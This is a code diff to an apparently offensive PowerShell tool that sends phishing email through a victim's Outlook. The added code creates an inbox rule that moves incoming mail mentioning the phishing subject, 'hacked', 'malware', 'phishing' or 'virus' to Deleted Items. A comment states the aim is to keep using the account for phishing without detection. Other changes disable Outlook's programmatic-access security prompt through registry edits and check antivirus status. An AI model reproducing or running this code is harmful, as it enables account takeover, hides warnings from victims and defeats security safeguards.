@@ -120,6 +120,8 @@ Function Invoke-Spam {
         $Signature = Get-Content -Path $sigpath
     }
 
+    #Create Outlook rule to automatically sends emails pertaining to phishing emails to deleted items folder 
+    Invoke-Rule -Subject $Subject -RuleName "RaiderIn"
 
      
     #Iterate through the list, craft the emails, and then send it off. 
@@ -145,11 +147,15 @@ Function Invoke-Spam {
 }
 
 #This function is a work-in-progress
-Function Invoke-SentItemsRule {
+Function Invoke-Rule {
 
     <#
     .SYNOPSIS
-    This function enables an Outlook rule where all mail items in the sent items folder, that match the specified subject string, will be sent to the deleted items folder
+    This function enables an Outlook rule where all received mail items, that match the specified subject flags, will be sent to the deleted items folder
+
+    .DESCRIPTION 
+    This function takes the subject string and other flagged words and applies them to a received items Outlook rule. Any items that match this rule will be 
+    sent to the deleted items folder. This allows for the account to be used in phishing for a longer period of time without detection.
 
     .PARAMETER Subject
     The subject string to use in the rule
@@ -168,6 +174,13 @@ Function Invoke-SentItemsRule {
         [switch]$Disable
     )
 
+    $flags = @()
+    $flags = $Subject.Split(" ")
+    $flags += "hacked"
+    $flags += "malware"
+    $flags += "phishing"
+    $flags += "virus"
+
 
     if($Disable){
         $rule = (($script:Outlook.session).DefaultStore).GetRules() | Where-Object {$_.Name -eq $RuleName}
@@ -176,17 +189,23 @@ Function Invoke-SentItemsRule {
     else{
 
         #$SentItemsFolder = Get-OutlookFolder -Name "SentMail"
-        $olRuleType = "Microsoft.Office.Interop.Outlook.OlRuleType" -as [type]
-        $MoveTarget = Get-OutlookFolder -Name "DeletedItems"
-        $rules = (($script:Outlook.session).DefaultStore).GetRules()
-        $rule = $rules.Create("$RuleName",$olRuleType::olRuleSend)
-        $SubjectCondition = $rule.Conditions.Subject 
-        $SubjectCondition.enabled = $True 
-        $SubjectCondition.Text = @("$Subject")
+        Add-Type -AssemblyName Microsoft.Office.Interop.Outlook | Out-Null 
+        $inbox = Get-OutlookFolder -Name "Inbox"
+        $DeletedFolder = Get-OutlookFolder -Name "DeletedItems"
+        $rules = $script:MAPI.DefaultStore.GetRules()
+        $rule = $rules.create($RuleName, [Microsoft.Office.Interop.Outlook.OlRuleType]::OlRuleReceive)
+
+        $Subject = $rule.Conditions.Subject
+        $Subject.Enabled = $true
+        $Subject.Text = $flags
         $action = $rule.Actions.MoveToFolder
-        $action.Folder = $MoveTarget
-        $action.enabled = $True
-        $rule.enabled = $True 
+        $action.enabled = $true
+        [Microsoft.Office.Interop.Outlook._MoveOrCopyRuleAction].InvokeMember(
+            "Folder",
+            [System.Reflection.BindingFlags]::SetProperty,
+            $null,
+            $action,
+            $DeletedFolder)
         $rules.Save()
     }
     
@@ -261,10 +280,10 @@ Function Select-NextItem{
     [CmdletBinding()]
     param(
         [Parameter(Mandatory = $False, Position = 0)]
-        [int]$Index = 1
+        [UInt32]$Index = 1
     )
     
-    $count += $Index
+    $script:count += $Index
 
     $items = $script:CurrentFolder.Items 
 
@@ -726,7 +745,7 @@ Function Disable-SecuritySettings{
     the keys exist, overwrite with the appropriate values to disable to security prompt for programmatic access.
 
     .DESCRIPTION
-    This function checks for the ObjectModelGuard, PromptOOMSend, and AdminSecurityMode registry keys for Outlook security. Most likely, this function must be 
+    This function checks for the ObjectModelGuard, PromptOOMSend, and AdminSecurityMode registry keys for Outlook security. This function must be 
     run in an administrative context in order to set the values for the registry keys. 
 
     .PARAMETER Version
@@ -750,7 +769,6 @@ Function Disable-SecuritySettings{
     )
 
     $count = 0
-    $Version = $Version.Substring(0,4)
 
     #Check AV to see if it's up to date. 
     $AV = Get-WmiObject -namespace root\SecurityCenter2 -class Antivirusproduct
@@ -972,20 +990,23 @@ Function Get-OutlookInstance{
 
     #>
 
-    [CmdletBinding()]
+    [CmdletBinding(DefaultParameterSetName = "None")]
     param(
 
-        [parameter(Mandatory = $False, Position = 0)]
+        [parameter(Mandatory = $False, ParameterSetName = 'Credentials')]
+        [switch]$DisablePrompt,
+
+        [parameter(Mandatory = $False, ParameterSetName = 'Credentials')]
         [string]$AdminUser,
 
-        [parameter(Mandatory = $False, Position = 1)]
+        [parameter(Mandatory = $False, ParameterSetName = 'Credentials')]
         [string]$AdminPass
     )
 
     #Switch user context from Administrator to the 
     Write-Verbose "Checking to see if Outlook is currently running"
     [System.Reflection.Assembly]::LoadWithPartialName("System.Runtime.InteropServices") | Out-Null
-    if(Get-Process | Where-Object {$_.ProcessName -eq "OUTLOOK"}){
+    if(Get-Process | Where-Object {$_.ProcessName -like "*OUTLOOK*"}){
         #If outlook is currently running, grab an instance. This script must be running in the same user context as Outlook in order for this to work.  
         try{
             $script:Outlook = [System.Runtime.InteropServices.Marshal]::GetActiveObject("Outlook.Application")
@@ -1005,23 +1026,37 @@ Function Get-OutlookInstance{
     }
 
     $OV = $script:Outlook.Version
+    $OV = $OV.Substring(0,4)
     
-    if($AdminUser -and $AdminPass){
-        $result = Disable-SecuritySettings -User $AdminUser -Password $AdminPass -Version $OV
-        Write-Verbose "Security Prompt should be disabled"
-        $script:DisableUser = $AdminUser
-        $script:DisablePass = $AdminPass
+    if($DisablePrompt){
+        if($AdminUser -and $AdminPass){
+            $result = Disable-SecuritySettings -User $AdminUser -Password $AdminPass -Version $OV
+            $script:DisableUser = $AdminUser
+            $script:DisablePass = $AdminPass
+            if($result){
+                Write-Verbose "Programmatic access prompt has been disabled"
+                $Script:MAPI = $script:Outlook.GetNamespace('MAPI')
+            }
+            else {
+                Write-Warning "Programmatic access has not been disabled"
+            }
+        }
+        else{
+            $result = Disable-SecuritySettings -Version $OV 
+            if($result){
+                Write-Verbose "Programmatic access prompt has been disabled"
+                $Script:MAPI = $script:Outlook.GetNamespace('MAPI')
+            }
+            else {
+                Write-Warning "Programmatic access has not been disabled"
+            }
+            
+        }
+    
     }
     else{
-        $result = Disable-SecuritySettings -Version $OV 
-    }
-
-    if($result){
-        Write-Verbose "Programmatic access prompt has been disabled"
         $Script:MAPI = $script:Outlook.GetNamespace('MAPI')
-    }
-    else{
-        Write-Warning "Programmitic access prompt has not been disabled"
+        Write-Verbose "Obtained MAPI session"
     }
 
     #$Script:MAPI = $script:Outlook.GetNamespace('MAPI')
